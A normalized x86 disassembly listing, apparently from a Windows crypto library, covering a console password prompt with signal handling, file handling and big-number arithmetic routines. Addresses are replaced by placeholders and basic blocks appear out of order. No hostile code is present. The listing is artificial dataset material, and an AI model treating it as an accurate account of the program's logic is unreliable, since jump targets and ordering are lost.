add esp 0x8
push ecx
push esi
call sub_100617b0
add esp 0x4
push eax
call fputs
mov edx [ rw-data ]
push edx
call fflush
add esp 0xc
push 0x0
push esi
call sub_100617a0
add esp 0x4
and eax 0x1
push eax
mov eax [ esp + 0x10 ]
push esi
push eax
call sub_10068340
add esp 0x10
pop esi
retn
sbb eax eax
sbb eax 0xffffffff
test cl cl
je r-xdata
mov eax [ rw-data ]
push r--data
push eax
call fprintf
mov ecx [ rw-data ]
push ecx
call fflush
add esp 0xc
xor eax eax
pop esi
retn
xor eax eax
jmp r-xdata
mov dl [ eax + 0x1 ]
mov bl [ edi + 0x1 ]
mov cl dl
cmp dl bl
jne r-xdata
pop edi
pop ebx
test eax eax
je r-xdata
add eax 0x2
add edi 0x2
test cl cl
jne r-xdata
mov dl [ eax ]
mov bl [ edi ]
mov cl dl
cmp dl bl
jne r-xdata
sub_10068340
mov eax 0x20c
call sub_1001d0d0
push ebx
push ebp
push esi
xor ebx ebx
push edi
mov [ rw-data ] ebx
push sub_10068620
push 0x16
mov [ esp + 0x18 ] ebx
mov [ rw-data ] ebx
call signal
push sub_10068620
push 0x8
mov [ rw-data ] eax
call signal
push sub_10068620
push 0x4
mov [ rw-data ] eax
call signal
push sub_10068620
push 0x2
mov [ rw-data ] eax
call signal
push sub_10068620
push 0xb
mov [ rw-data ] eax
call signal
push sub_10068620
push 0xf
mov [ rw-data ] eax
call signal
mov ebp [ esp + 0x258 ]
add esp 0x30
cmp ebp ebx
mov [ rw-data ] eax
mov [ rw-data ] 0x2
mov [ esp + 0x1c ] bl
jne r-xdata
mov eax [ rw-data ]
lea ecx [ esp + 0x1c ]
push eax
push 0x1ff
push ecx
call fgets
add esp 0xc
mov edi 0x1ff
lea esi [ esp + 0x1c ]
mov eax [ rw-data ]
cmp eax 0x2
jne r-xdata
mov edx [ rw-data ]
test [ edx + 0xc ] 0x30
jne r-xdata
mov [ esi ] al
inc esi
cmp eax 0xa
je r-xdata
mov eax 0xa
cmp ebp ebx
jne r-xdata
mov [ esp + 0x10 ] 0xffffffff
lea eax [ esp + 0x1c ]
push 0xa
push eax
call strchr
add esp 0x8
cmp eax ebx
je r-xdata
push 0xfffffff6
mov [ esi ] bl
call [ GetStdHandle@IAT ]
push eax
call [ FlushConsoleInputBuffer@IAT ]
lea eax [ esp + 0x1c ]
jmp r-xdata
cmp edi ebx
jne r-xdata
mov eax [ rw-data ]
cmp eax edi
pop edi
pop esi
pop ebp
pop ebx
jl r-xdata
mov eax [ rw-data ]
push r--data
push eax
call fprintf
add esp 0x8
mov esi [ rw-data ]
cmp [ esp + 0x22c ] ebx
je r-xdata
cmp eax ebx
mov edi 0x1
je r-xdata
dec edi
call _getch
cmp eax 0xd
jne r-xdata
lea ecx [ esp + 0xc ]
push 0x200
push ecx
call sub_10026870
mov eax [ esp + 0x8 ]
add esp 0x214
retn
mov ecx [ rw-data ]
push ecx
push 0x16
call signal
mov edx [ rw-data ]
push edx
push 0x8
call signal
mov eax [ rw-data ]
push eax
push 0x4
call signal
mov ecx [ rw-data ]
push ecx
push 0x2
call signal
mov edx [ rw-data ]
push edx
push 0xb
call signal
mov eax [ rw-data ]
push eax
push 0xf
call signal
add esp 0x30
push esi
lea ecx [ esp + 0x18 ]
push 0x4
push ecx
call fgets
lea edx [ esp + 0x20 ]
push 0xa
push edx
call strchr
add esp 0x14
test eax eax
je r-xdata
mov ecx [ esp + 0x224 ]
mov edx [ esp + 0x220 ]
lea eax [ esp + 0x1c ]
push eax
push ecx
push edx
call sub_10061810
add esp 0xc
test eax eax
jl r-xdata
mov [ eax ] bl
jmp r-xdata
mov [ esp + 0x10 ] edi
sub_10068560
push 0x1d9
push r--data
push 0x1f
push 0x9
call sub_1001f5b0
push r--data
push r--data
mov [ rw-data ] 0x1
call fopen
add esp 0x18
mov [ rw-data ] eax
test eax eax
jne r-xdata
push r--data
push r--data
call fopen
add esp 0x8
mov [ rw-data ] eax
test eax eax
jne r-xdata
mov [ rw-data ] _iob@IAT
mov eax 0x1
retn
mov [ rw-data ] _itoa@IAT
sub_100685d0
mov eax [ rw-data ]
cmp eax _iob@IAT
je r-xdata
mov eax [ rw-data ]
cmp eax _itoa@IAT
je r-xdata
push eax
call fclose
add esp 0x4
push 0x23b
push r--data
push 0x1f
push 0xa
call sub_1001f5b0
add esp 0x10
mov eax 0x1
retn
push eax
call fclose
add esp 0x4
sub_10068630
mov eax 0x1110
call sub_1001d0d0
push ebx
call sub_1001f590
mov ebx eax
lea eax [ esp + 0x10 ]
lea ecx [ esp + 0xc ]
push eax
lea edx [ esp + 0x8 ]
push ecx
lea eax [ esp + 0x10 ]
push edx
push eax
call sub_1001dfd0
add esp 0x10
test eax eax
je r-xdata
pop ebx
add esp 0x1110
retn
push ebp
mov ebp [ esp + 0x111c ]
push esi
mov esi [ esp + 0x1124 ]
push edi
mov edx [ esp + 0x10 ]
push eax
mov eax [ esp + 0x18 ]
push edx
lea ecx [ esp + 0x28 ]
push eax
push ecx
push ebx
push r--data
lea edx [ esp + 0x138 ]
push 0x1000
push edx
call sub_100279b0
lea edi [ esp + 0x140 ]
or ecx 0xffffffff
xor eax eax
push esi
[ edi ]
not ecx
dec ecx
lea eax [ esp + 0x144 ]
push ecx
push eax
call ebp
lea ecx [ esp + 0x48 ]
lea edx [ esp + 0x44 ]
push ecx
lea eax [ esp + 0x40 ]
push edx
lea ecx [ esp + 0x48 ]
push eax
push ecx
call sub_1001dfd0
add esp 0x3c
test eax eax
jne r-xdata
mov eax rw-data
lea ecx [ esp + 0x20 ]
push 0x100
push ecx
push eax
call sub_10068710
mov al [ esp + 0x28 ]
add esp 0xc
test al 0x2
mov eax [ esp + 0x18 ]
jne r-xdata
pop edi
pop esi
pop ebp
sub_10068710
mov eax 0xc8
call sub_1001d0d0
push ebx
push ebp
push esi
mov esi [ esp + 0xd8 ]
push edi
mov edi esi
shr edi 0xc
mov ebx esi
push esi
and edi 0xfff
and ebx 0xfff
call sub_1002fe70
push esi
mov ebp eax
call sub_1002fef0
push esi
mov [ esp + 0x1c ] eax
call sub_1002ff80
add esp 0xc
mov [ esp + 0x14 ] eax
test ebp ebp
jne r-xdata
mov eax [ esp + 0x10 ]
test eax eax
jne r-xdata
mov eax esi
lea ecx [ esp + 0x98 ]
shr eax 0x18
push eax
push r--data
push 0x40
push ecx
call sub_100279b0
add esp 0x10
mov ecx [ esp + 0x14 ]
test ecx ecx
jne r-xdata
push edi
push r--data
lea edx [ esp + 0x60 ]
push 0x40
push edx
call sub_100279b0
add esp 0x10
mov eax [ esp + 0x10 ]
test eax eax
jne r-xdata
push ebx
push r--data
lea eax [ esp + 0x20 ]
push 0x40
push eax
call sub_100279b0
add esp 0x10
lea ecx [ esp + 0x18 ]
test ebp ebp
jne r-xdata
lea eax [ esp + 0x58 ]
mov ebx [ esp + 0xe0 ]
push ecx
push eax
push ebp
mov ebp [ esp + 0xf0 ]
push esi
push r--data
push ebp
push ebx
call sub_100279b0
mov edi ebx
or ecx 0xffffffff
xor eax eax
add esp 0x1c
[ edi ]
not ecx
dec ecx
lea edx [ ebp - 0x1 ]
cmp ecx edx
jne r-xdata
lea ebp [ esp + 0x98 ]
pop edi
pop esi
pop ebp
pop ebx
add esp 0xc8
retn
cmp ebp 0x4
jbe r-xdata
mov eax ebx
xor esi esi
lea eax [ esi + ebx ]
lea eax [ eax + ebp - 0x5 ]
mov [ eax ] 0x3a
lea ecx [ esi + ebx ]
lea edx [ ecx + ebp - 0x5 ]
cmp eax edx
jbe r-xdata
push 0x3a
push eax
call strchr
add esp 0x8
test eax eax
je r-xdata
inc eax
inc esi
cmp esi 0x4
jl r-xdata
sub_10068840
mov eax 0x4
call sub_1001d0d0
push ebx
mov ebx [ esp + 0x14 ]
push ebp
push esi
push edi
push ebx
mov [ esp + 0x14 ] 0xfffffffe
xor esi esi
call sub_1002dd20
push ebx
call sub_1002de70
push ebx
mov edi eax
call sub_1002de70
mov ebp eax
xor ebx ebx
add esp 0xc
cmp ebp ebx
je r-xdata
mov edx [ esp + 0x20 ]
push edx
call sub_1002de00
add esp 0x4
mov eax 0xfffffffe
test esi esi
pop edi
pop esi
pop ebp
pop ebx
jne r-xdata
mov eax [ esp + 0x18 ]
push eax
push edi
call sub_10029bf0
mov esi eax
add esp 0x8
neg esi
sbb esi esi
inc esi
jne r-xdata
pop ecx
retn
mov eax [ esp ]
mov ecx [ esp + 0x1c ]
push ecx
push ebp
call sub_10029bf0
mov esi eax
add esp 0x8
neg esi
sbb esi esi
inc esi
jne r-xdata
mov eax [ ebp + 0x4 ]
cmp eax ebx
jne r-xdata
cmp [ edi + 0x4 ] ebx
jle r-xdata
mov ecx [ edi + 0x4 ]
mov eax 0x1
cmp ecx eax
jne r-xdata
cmp eax ebx
jle r-xdata
mov ecx [ edi ]
test [ ecx ] 0x1
jne r-xdata
mov [ esp + 0x10 ] ebx
mov edx [ edi ]
cmp [ edx ] eax
jne r-xdata
mov edx [ ebp ]
test [ edx ] 0x1
je r-xdata
push 0x0
push ebp
call sub_1002a150
add esp 0x8
test eax eax
jne r-xdata
mov [ esp + 0x10 ] eax
jmp r-xdata
push ebx
push ebp
push ebp
call sub_10035fd0
mov esi eax
add esp 0xc
neg esi
sbb esi esi
inc esi
jne r-xdata
inc ebx
push ebx
push ebp
call sub_1002a150
add esp 0x8
test eax eax
je r-xdata
test bl 0x1
je r-xdata
mov [ esp + 0x10 ] 0x1
mov eax [ edi + 0x4 ]
test eax eax
jne r-xdata
mov eax [ edi + 0x4 ]
test eax eax
je r-xdata
mov [ ebp + 0xc ] 0x0
mov eax [ edi + 0xc ]
test eax eax
je r-xdata
mov eax [ edi ]
mov eax [ eax ]
and eax 0x7
mov ecx [ eax * 4 + r--data ]
mov [ esp + 0x10 ] ecx
jmp r-xdata
xor eax eax
and eax 0x7
mov ecx [ eax * 4 + r--data ]
mov [ esp + 0x10 ] ecx
jmp r-xdata
cmp [ ebp + 0x4 ] 0x1
jne r-xdata
xor ebx ebx
push ebx
push edi
call sub_1002a150
add esp 0x8
test eax eax
jne r-xdata
mov edx [ esp + 0x10 ]
neg edx
mov [ esp + 0x10 ] edx
mov eax [ ebp + 0xc ]
test eax eax
je r-xdata
mov [ esp + 0x10 ] 0x0
jmp r-xdata
mov ecx [ ebp ]
cmp [ ecx ] 0x1
jne r-xdata
push ebx
push edi
push edi
call sub_10035fd0
mov esi eax
add esp 0xc
neg esi
sbb esi esi
inc esi
jne r-xdata
inc ebx
push ebx
push edi
call sub_1002a150
add esp 0x8
test eax eax
je r-xdata
mov eax [ ebp + 0xc ]
test eax eax
je r-xdata
test bl 0x1
je r-xdata
mov eax [ edi + 0xc ]
test eax eax
mov eax [ edi + 0x4 ]
je r-xdata
mov eax [ ebp + 0x4 ]
test eax eax
jne r-xdata
test eax eax
jne r-xdata
test eax eax
jne r-xdata
mov eax [ ebp ]
mov eax [ eax ]
xor eax eax
jmp r-xdata
mov eax [ edi ]
mov eax [ eax ]
xor eax eax
jmp r-xdata
mov edx [ edi ]
mov eax [ edx ]
not eax
jmp r-xdata
xor eax eax
not eax
jmp r-xdata
and eax 0x7
mov ecx [ eax * 4 + r--data ]
imul ecx [ esp + 0x10 ]
mov [ esp + 0x10 ] ecx
mov ecx [ ebp ]
mov ecx [ ecx ]
xor ecx ecx
jmp r-xdata
mov ecx [ ebp + 0x4 ]
test ecx ecx
jne r-xdata
mov eax [ esp + 0x20 ]
push eax
push edi
push ebp
push ebp
call sub_100579b0
mov esi eax
add esp 0x10
neg esi
sbb esi esi
inc esi
jne r-xdata
mov edx [ esp + 0x10 ]
neg edx
mov [ esp + 0x10 ] edx
and ecx eax
test cl 0x2
je r-xdata
mov eax edi
mov edi ebp
mov ebp eax
mov [ eax + 0xc ] 0x0
jmp r-xdata
sub_10068ab0
mov eax 0x10
call sub_1001d0d0
push ebx
mov ebx [ esp + 0x18 ]
push ebp
mov ebp [ esp + 0x28 ]
push esi
mov esi [ esp + 0x28 ]
push edi
mov edi ebx
mov eax [ esi + 0x4 ]
mov [ esp + 0x10 ] edi
test eax eax
jle r-xdata
cmp eax 0x1
jne r-xdata
mov ecx [ esi ]
mov ecx [ ecx ]
test cl 0x1
je r-xdata
push 0x5e
push r--data
push 0x70
push 0x79
push 0x3
call sub_1001de60
add esp 0x14
mov edx [ esi ]
cmp [ edx ] 0x2
jne r-xdata
cmp eax 0x1
jne r-xdata
test ebx ebx
jne r-xdata
mov eax [ esp + 0x28 ]
mov ecx [ eax + 0x4 ]
test ecx ecx
je r-xdata
cmp ecx eax
je r-xdata
mov eax [ esp + 0x28 ]
push 0x0
push eax
call sub_1002a150
push eax
push edi
call sub_10029cf0
add esp 0x10
test eax eax
jne r-xdata
call sub_100299b0
mov edi eax
test edi edi
mov [ esp + 0x10 ] edi
jne r-xdata
test ebx ebx
jne r-xdata
cmp ecx 0x1
jne r-xdata
mov eax edi
pop edi
pop esi
pop ebp
pop ebx
add esp 0x10
retn
jmp r-xdata
jmp r-xdata
cmp [ eax + 0x4 ] 0x1
jne r-xdata
call sub_100299b0
test eax eax
mov [ esp + 0x10 ] eax
je r-xdata
push ebp
call sub_1002dd20
push ebp
call sub_1002de70
push ebp
mov [ esp + 0x20 ] eax
call sub_1002de70
push ebp
mov [ esp + 0x28 ] eax
call sub_1002de70
push ebp
mov ebx eax
call sub_1002de70
push ebp
mov edi eax
call sub_1002de70
push ebp
mov [ esp + 0x4c ] eax
call sub_1002de70
add esp 0x1c
mov [ esp + 0x2c ] eax
test eax eax
je r-xdata
mov edx [ eax ]
cmp [ edx ] 0x1
jne r-xdata
cmp edi ebx
je r-xdata
mov [ esp + 0x10 ] 0x0
xor eax eax
mov ecx [ eax ]
cmp [ ecx ] 0x1
jne r-xdata
mov eax [ esp + 0x28 ]
mov ebx [ esp + 0x24 ]
mov edi [ esp + 0x10 ]
mov eax [ esp + 0x10 ]
test eax eax
je r-xdata
mov eax [ esp + 0x24 ]
test eax eax
jne r-xdata
mov ecx [ eax + 0xc ]
test ecx ecx
je r-xdata
pop edi
pop esi
pop ebp
xor eax eax
pop ebx
add esp 0x10
retn
push edi
call sub_10029950
add esp 0x4
xor eax eax
pop edi
pop esi
pop ebp
pop ebx
add esp 0x10
retn
mov ecx [ eax + 0xc ]
test ecx ecx
jne r-xdata
cmp eax [ esp + 0x24 ]
je r-xdata
mov eax [ esp + 0x28 ]
mov ecx [ esp + 0x14 ]
push ebp
push esi
push eax
push ecx
call sub_100579b0
add esp 0x10
test eax eax
je r-xdata
call sub_100299b0
test eax eax
mov [ esp + 0x10 ] eax
je r-xdata
mov eax 0x1
jmp r-xdata
push eax
call sub_100298f0
add esp 0x4
push 0x1
push esi
mov [ esp + 0x24 ] 0x1
call sub_1002a150
add esp 0x8
test eax eax
jne r-xdata
push eax
push edi
call sub_10029cf0
add esp 0x8
test eax eax
jne r-xdata
push 0x2
push esi
push ebx
call sub_10035fd0
add esp 0xc
test eax eax
je r-xdata
mov eax [ esp + 0x1c ]
inc eax
push eax
push esi
mov [ esp + 0x24 ] eax
call sub_1002a150
add esp 0x8
test eax eax
je r-xdata
push 0x1
push ebx
mov [ ebx + 0xc ] 0x0
call sub_10035b20
add esp 0x8
test eax eax
je r-xdata
mov eax [ esp + 0x1c ]
cmp eax 0x1
jne r-xdata
mov edx [ esp + 0x14 ]
mov eax [ esp + 0x10 ]
push ebp
push esi
push ebx
push edx
push eax
call sub_1004c7d0
add esp 0x14
jmp r-xdata
cmp eax 0x2
push esi
jne r-xdata
test eax eax
je r-xdata
push ebx
call sub_10029bf0
add esp 0x8
test eax eax
je r-xdata
mov ecx [ esp + 0x18 ]
push ecx
push edi
call sub_10057bf0
add esp 0xc
test eax eax
je r-xdata
mov ecx [ esp + 0x10 ]
push ebp
push esi
mov esi [ esp + 0x38 ]
push ecx
push esi
call sub_10057bb0
add esp 0x10
test eax eax
je r-xdata
mov [ ebx + 0xc ] 0x0
mov [ esp + 0x28 ] 0x2
push 0x3
push esi
push ebx
call sub_10035fd0
add esp 0xc
test eax eax
je r-xdata
mov edx [ esp + 0x14 ]
push edx
push esi
call sub_1002a000
add esp 0x8
test eax eax
je r-xdata
push 0x0
push 0x0
push esi
call sub_10029870
mov ecx [ esp + 0x38 ]
add esp 0x4
push eax
push ecx
call sub_10049480
add esp 0x10
test eax eax
je r-xdata
mov edx eax
mov eax [ esp + 0x2c ]
push edx
push eax
call sub_10029cf0
add esp 0x8
test eax eax
je r-xdata
mov edx [ esp + 0x18 ]
push ebp
push esi
push ebx
push edi
push edx
mov [ ebx + 0xc ] 0x0
call sub_1004c7d0
add esp 0x14
test eax eax
je r-xdata
push ebp
call sub_1002de00
mov eax [ esp + 0x14 ]
add esp 0x4
pop edi
pop esi
pop ebp
pop ebx
add esp 0x10
retn
push 0x178
mov edx [ esp + 0x2c ]
push esi
push edx
call sub_10029fb0
add esp 0x8
test eax eax
jl r-xdata
jmp r-xdata
mov eax [ esp + 0x18 ]
mov ecx [ esp + 0x2c ]
push ebp
push esi
push eax
push ecx
call sub_10057bb0
add esp 0x10
test eax eax
je r-xdata
mov eax [ esp + 0x2c ]
mov ecx [ eax + 0x4 ]
test ecx ecx
jne r-xdata
mov eax [ esi + 0xc ]
test eax eax
mov eax sub_10038680
jne r-xdata
mov eax [ esp + 0x2c ]
push ebp
push ebx
push eax
call sub_10068840
add esp 0xc
cmp eax 0xffffffff
jl r-xdata
mov edx [ esp + 0x2c ]
push ebp
push esi
push edx
push edi
push edi
call sub_10057b10
add esp 0x14
test eax eax
je r-xdata
mov ecx [ esp + 0x28 ]
mov edx eax
push ecx
push edx
call sub_10029cf0
add esp 0x8
test eax eax
je r-xdata
mov ecx [ esp + 0x2c ]
push esi
push ecx
push ecx
call eax
add esp 0xc
test eax eax
je r-xdata
mov eax sub_10038960
test eax eax
je r-xdata
push 0x1
push edi
call sub_10035be0
add esp 0x8
test eax eax
je r-xdata
push 0xec
push r--data
push 0x70
push 0x79
push 0x3
call sub_1001de60
add esp 0x14
jmp r-xdata
cmp eax 0x1
jne r-xdata
mov eax [ esp + 0x18 ]
mov ecx [ esp + 0x14 ]
mov edx [ esp + 0x30 ]
push ebp
push esi
push eax
push ecx
push edx
call sub_10057b10
add esp 0x14
test eax eax
je r-xdata
cmp eax 0xffffffff
je r-xdata
mov eax [ esp + 0x28 ]
inc eax
cmp eax 0x52
mov [ esp + 0x28 ] eax
jge r-xdata
mov eax [ esp + 0x30 ]
push ebp
push esi
push edi
push eax
push eax
call sub_10057b10
add esp 0x14
test eax eax
je r-xdata
mov ecx [ esp + 0x1c ]
push ecx
push ebx
push ebx
call sub_10035fd0
add esp 0xc
test eax eax
je r-xdata
push 0xf9
push r--data
push 0x71
push 0x79
push 0x3
call sub_1001de60
add esp 0x14
jmp r-xdata
jmp r-xdata
mov eax [ esp + 0x30 ]
mov ecx [ esp + 0x10 ]
push eax
push ecx
jmp r-xdata
mov eax [ esp + 0x2c ]
push ebp
push esi
push ebx
push eax
push eax
call sub_1004c7d0
add esp 0x14
test eax eax
je r-xdata
mov eax [ esp + 0x28 ]
cmp eax 0x16
jge r-xdata
call sub_10029bf0
add esp 0x8
mov eax [ esp + 0x2c ]
cmp [ eax + 0x4 ] 0x1
jne r-xdata
push ebx
push edi
call sub_10035de0
add esp 0x8
test eax eax
je r-xdata
mov edx [ eax ]
cmp [ edx ] 0x1
jne r-xdata
mov eax [ edi + 0x4 ]
push ebp
test eax eax
push esi
jne r-xdata
mov ecx [ eax + 0xc ]
test ecx ecx
jne r-xdata
mov eax [ esp + 0x1c ]
mov ecx [ esp + 0x38 ]
push edi
push eax
push ecx
call sub_1004c7d0
add esp 0x14
test eax eax
je r-xdata
mov eax [ esp + 0x1c ]
push eax
push edi
call sub_100579b0
add esp 0x10
test eax eax
je r-xdata
push 0x105
push r--data
push 0x70
push 0x79
push 0x3
call sub_1001de60
add esp 0x14
jmp r-xdata
mov edx [ esp + 0x30 ]
mov eax [ edx + 0x4 ]
test eax eax
jne r-xdata
mov eax [ edi + 0x4 ]
test eax eax
jne r-xdata
mov ecx [ esp + 0x30 ]
mov edx [ esp + 0x18 ]
push ebp
push esi
push ecx
push edx
call sub_10057bb0
add esp 0x10
test eax eax
je r-xdata
mov eax [ esp + 0x10 ]
push 0x0
push eax
call sub_10029cf0
add esp 0x8
push ebp
call sub_1002de00
mov eax [ esp + 0x14 ]
add esp 0x4
pop edi
pop esi
pop ebp
pop ebx
add esp 0x10
retn
mov edx [ esp + 0x30 ]
push 0x1
push edx
call sub_10029cf0
add esp 0x8
test eax eax
je r-xdata
mov ecx [ esp + 0x10 ]
push 0x0
push ecx
call sub_10029cf0
add esp 0x8
push ebp
call sub_1002de00
mov eax [ esp + 0x14 ]
add esp 0x4
pop edi
pop esi
pop ebp
pop ebx
add esp 0x10
retn
mov eax [ esp + 0x14 ]
push ebp
push esi
push eax
mov eax [ esp + 0x24 ]
push eax
push eax
call sub_10057b10
add esp 0x14
test eax eax
je r-xdata
mov ecx [ esp + 0x14 ]
mov eax [ esp + 0x30 ]
push ebp
push esi
push ecx
push eax
push eax
call sub_10057b10
add esp 0x14
test eax eax
je r-xdata
mov eax [ esp + 0x18 ]
mov ebx 0x1
cmp [ eax + 0x4 ] ebx
jne r-xdata
push ebp
push esi
push eax
push edi
mov [ esp + 0x38 ] ebx
call sub_10057bb0
add esp 0x10
test eax eax
je r-xdata
mov edx [ eax ]
cmp [ edx ] ebx
jne r-xdata
cmp [ edi + 0x4 ] 0x1
jne r-xdata
mov ecx [ eax + 0xc ]
test ecx ecx
je r-xdata
mov eax [ esp + 0x1c ]
inc ebx
cmp ebx eax
mov [ esp + 0x28 ] ebx
je r-xdata
mov eax [ edi ]
cmp [ eax ] 0x1
jne r-xdata
mov edx [ esp + 0x30 ]
mov eax [ esp + 0x10 ]
push edx
push eax
push 0x15a
jmp r-xdata
push ebp
push esi
push edi
push edi
push edi
call sub_10057b10
add esp 0x14
test eax eax
je r-xdata
mov eax [ edi + 0xc ]
test eax eax
je r-xdata
push r--data
push 0x6f
push 0x79
push 0x3
call sub_1001de60
add esp 0x14
jmp r-xdata
jmp r-xdata
mov ecx [ esp + 0x2c ]
push ecx
push edi
call sub_10029bf0
add esp 0x8
test eax eax
je r-xdata
mov ebx [ esp + 0x1c ]
mov edx [ esp + 0x28 ]
sub ebx edx
dec ebx
test ebx ebx
jle r-xdata
mov edx [ esp + 0x2c ]
push ebp
push esi
push edi
push edi
push edx
call sub_10057b10
add esp 0x14
test eax eax
je r-xdata
push ebp
push esi
push edi
push edi
call sub_10057bb0
add esp 0x10
test eax eax
je r-xdata
mov eax [ esp + 0x30 ]
push ebp
push esi
push edi
push eax
push eax
call sub_10057b10
add esp 0x14
test eax eax
je r-xdata
dec ebx
test ebx ebx
jg r-xdata
mov eax [ esp + 0x2c ]
push ebp
push esi
push eax
mov eax [ esp + 0x24 ]
push eax
push eax
call sub_10057b10
add esp 0x14
test eax eax
je r-xdata
mov ecx [ esp + 0x28 ]
mov [ esp + 0x1c ] ecx
jmp r-xdata
sub_10069250
push esi
push 0x84
push r--data
push 0x10
call sub_1001d4c0
mov esi eax
add esp 0xc
test esi esi
je r-xdata
mov eax esi
pop esi
retn
mov eax [ esp + 0x8 ]
push esi
call [ eax + 0x8 ]
add esp 0x4
test eax eax
jne r-xdata
push esi
call sub_1001d740
add esp 0x4
xor eax eax
pop esi
retn
sub_100692f0
push esi
mov esi [ esp + 0x8 ]
test esi esi
je r-xdata
xor eax eax
pop esi
retn
push esi
call sub_1006a1f0
push esi
call sub_1001d740
add esp 0x8
mov eax 0x1
pop esi
retn
sub_10069340
mov eax [ esp + 0x8 ]
push esi
push rw-data
push eax
call sub_1002a440
mov esi eax
add esp 0x8
test esi esi
jne r-xdata
mov ecx [ esp + 0x10 ]
mov edx [ esp + 0x8 ]
push edi
push ecx
push esi
push edx
call sub_100693d0
push esi
mov edi eax
call sub_10020880
add esp 0x10
mov eax edi
pop edi
pop esi
retn
call sub_1001e020
and eax 0xfff
cmp eax 0x80
jne r-xdata
push 0xc7
push r--data
push 0x2
push 0x78
push 0xe
call sub_1001de60
add esp 0x14
xor eax eax
pop esi
retn
push 0xc5
push r--data
push 0x72
push 0x78
push 0xe
call sub_1001de60
add esp 0x14
xor eax eax
pop esi
retn
sub_100693d0
mov eax 0x38
call sub_1001d0d0
push ebx
push ebp
push esi
push edi
mov edi [ esp + 0x4c ]
xor esi esi
xor ebp ebp
mov [ esp + 0x18 ] esi
mov eax [ edi + 0x8 ]
mov [ esp + 0x28 ] ebp
mov [ esp + 0x10 ] esi
mov [ esp + 0x34 ] eax
call sub_1001dc60
mov ebx eax
test ebx ebx
mov [ esp + 0x20 ] ebx
jne r-xdata
push 0xe8
push r--data
push 0xa
call sub_1001d4c0
add esp 0xc
mov [ esp + 0x10 ] eax
test eax eax
jne r-xdata
push 0xe4
push r--data
push 0x7
push 0x79
push 0xe
call sub_1001de60
add esp 0x14
jmp r-xdata
push 0xa
push r--data
push eax
call sub_100267d0
push edi
call sub_1006a1b0
add esp 0x10
test eax eax
jne r-xdata
push 0xeb
jmp r-xdata
mov eax [ esp + 0x10 ]
test eax eax
je r-xdata
mov ecx [ esp + 0x10 ]
push ecx
push edi
call sub_1006a3b0
add esp 0x8
mov [ esp + 0x24 ] eax
test eax eax
jne r-xdata
push 0xf2
jmp r-xdata
push r--data
push 0x41
mov eax [ esp + 0x54 ]
test eax eax
je r-xdata
push eax
call sub_1001d740
add esp 0x4
xor ebp ebp
push 0x200
push ebx
mov [ esp + 0x24 ] ebp
call sub_1001dce0
add esp 0x8
test eax eax
je r-xdata
push 0xfa
push r--data
push 0x67
jmp r-xdata
push ebp
push r--data
lea edx [ esp + 0x40 ]
push 0xd
push edx
call sub_100279b0
lea eax [ esp + 0x48 ]
push eax
push r--data
push 0x2
call sub_1001e1a0
mov eax [ edi + 0x8 ]
mov ecx [ esp + 0x50 ]
add esp 0x1c
cmp ecx eax
je r-xdata
mov [ eax ] ebp
push 0x105
push r--data
push 0x7
jmp r-xdata
mov ebx [ esp + 0x20 ]
mov edx [ esp + 0x50 ]
push 0x1ff
mov esi [ ebx + 0x4 ]
mov [ esi + ebp ] 0x0
add esi ebp
push esi
push edx
call sub_10020b20
mov edi esi
or ecx 0xffffffff
xor eax eax
add esp 0xc
mov [ esi + 0x1ff ] 0x0
[ edi ]
not ecx
dec ecx
mov edx ecx
jne r-xdata
push 0x79
push 0xe
call sub_1001de60
add esp 0x14
test esi esi
je r-xdata
test eax eax
je r-xdata
xor edi edi
test ecx ecx
mov [ esp + 0x1c ] edi
jle r-xdata
mov eax [ esp + 0x1c ]
test eax eax
je r-xdata
pop edi
pop esi
pop ebp
xor eax eax
pop ebx
add esp 0x38
retn
mov eax [ esi + 0x4 ]
test eax eax
je r-xdata
push eax
call sub_10067d90
add esp 0x4
mov [ edi + 0x8 ] 0x0
test edx edx
je r-xdata
mov al [ esi + ecx - 0x1 ]
cmp al 0xd
je r-xdata
push ebx
call sub_1001dca0
mov eax [ esp + 0x14 ]
add esp 0x4
test eax eax
je r-xdata
mov eax [ esi + 0x8 ]
test eax eax
je r-xdata
push eax
call sub_1001d740
add esp 0x4
mov eax [ esp + 0x28 ]
mov [ ecx + esi ] 0x0
inc eax
mov [ esp + 0x28 ] eax
cmp ecx edx
jne r-xdata
dec ecx
test ecx ecx
jg r-xdata
cmp al 0xa
jne r-xdata
pop edi
pop esi
pop ebp
mov eax 0x1
pop ebx
add esp 0x38
retn
push eax
call sub_1001d740
add esp 0x4
push esi
call sub_1001d740
add esp 0x4
push eax
call sub_1001d740
add esp 0x4
test edi edi
jne r-xdata
mov eax [ ebx + 0x4 ]
mov ecx [ esp + 0x4c ]
xor edx edx
mov ecx [ ecx + 0x4 ]
mov dl [ eax + ebp - 0x1 ]
lea eax [ eax + ebp - 0x1 ]
test [ ecx + edx * 2 ] 0x20
je r-xdata
mov edi 0x1
mov [ esp + 0x1c ] edi
jmp r-xdata
mov eax [ esp + 0x20 ]
lea edx [ ebp + 0x200 ]
push edx
push eax
call sub_1001dce0
add esp 0x8
test eax eax
jne r-xdata
mov eax [ esp + 0x20 ]
mov ecx [ esp + 0x4c ]
xor edx edx
xor ebp ebp
mov esi [ eax + 0x4 ]
mov ecx [ ecx + 0x4 ]
mov [ esp + 0x30 ] ebp
mov eax esi
mov dl [ esi ]
mov dx [ ecx + edx * 2 ]
test dh 0x8
jne r-xdata
cmp ebp 0x1
jle r-xdata
add ebp ecx
mov [ esp + 0x18 ] 0x0
cmp ebp 0x1
jl r-xdata
mov [ eax ] 0x0
test dl 0x10
je r-xdata
dec ebp
mov [ esp + 0x1c ] 0x1
jmp r-xdata
xor edx edx
mov dl [ eax - 0x1 ]
test [ ecx + edx * 2 ] 0x20
jne r-xdata
mov cl [ esi ]
mov edx ecx
and edx 0xff
test [ eax + edx * 2 ] 0x8
jne r-xdata
test cl 0x8
jne r-xdata
mov dl [ eax ]
mov edi edx
and edi 0xff
mov bx [ ecx + edi * 2 ]
test bl 0x80
mov [ esp + 0x14 ] ebx
jne r-xdata
inc eax
xor edx edx
mov dl [ eax ]
mov dx [ ecx + edx * 2 ]
test dh 0x8
je r-xdata
cmp cl 0x5b
jne r-xdata
inc esi
xor edx edx
mov dl [ esi ]
mov cx [ eax + edx * 2 ]
test cl 0x10
jne r-xdata
test bh 0x4
je r-xdata
jmp r-xdata
mov [ esp + 0x2c ] esi
mov [ esp + 0x14 ] 0x0
mov ecx esi
lea edi [ esi + 0x1 ]
xor ecx ecx
mov cl [ edi ]
mov cx [ eax + ecx * 2 ]
test cl 0x10
je r-xdata
mov bl [ esp + 0x14 ]
test bl 0x40
je r-xdata
